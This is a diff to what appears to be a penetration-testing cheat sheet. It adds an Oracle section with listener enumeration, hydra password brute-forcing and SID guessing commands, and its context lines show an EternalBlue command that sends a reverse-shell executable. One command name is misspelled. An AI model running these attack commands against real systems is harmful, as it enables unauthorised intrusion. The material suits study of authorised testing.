@@ -19,6 +19,7 @@ Table of Contents
       * [From DNSAdmin group to Administrators](#from-dnsadmin-to-administrator)
       * [From Exchange Windows Permissions group to Administrators](#from-exchange-windows-permissions-group-to-administrators)
    * [EternalBlue Vulnerabilities exploitation](#eternalblue-vulnerabilities-exploitation)
+   * [Oracle Hacking](#oracle-hacking)
    * [WebApplication Hacking](#webapplication-hacking)
       * [Create a PHP Backdoor shell](#create-a-php-backdoor-shell)
       * [Demonstrating the possibility of steal cookies abusing of XSS vulnerability](#demonstrating-the-possibility-of-steal-cookies-abusing-of-xss-vulnerability)
@@ -235,6 +236,36 @@ There is also a [usefull script](https://github.com/nixawk/labs/blob/master/MS17
  ```bash
  python send_and_execute.py $ip reverse-shell.exe
  ```
+
+# Oracle Hacking
+
+First of all we need to know SID, which is basically the name of the databases in the Oracle structure.
+If the listener is not password protected, we should get it just running this simple command:
+```bash
+nscmd10g  status -h [IP]
+```
+We could get errors in this execution, we can check these errors in [this site](https://docs.oracle.com/database/121/ERRMG/TNS-00000.htm#ERRMG-GUID-D723D931-ECBA-4FA4-BF1B-1F4FE2EEBAD7").
+
+If the error would points to a incompatibility between your machine and server, you can add one flag to the previous command like this:
+
+```bash
+tnscmd10g status --10G -h [IP]
+```
+
+If the error persists, the listener could be password protected, with hydra we can get the password:
+
+```bash
+hydra -P [WORDLIST] -t 32 -s 1521 [IP] oracle-listener
+```
+
+It very recommendable to bruteforce the SID as well:
+
+```bash
+sidguess -i [IP] -d /usr/share/wordlists/metasploit/sid.txt 
+```
+
+This previous command has rescued me several times.
+
 
 # WebApplication Hacking
 ## Create a PHP Backdoor shell
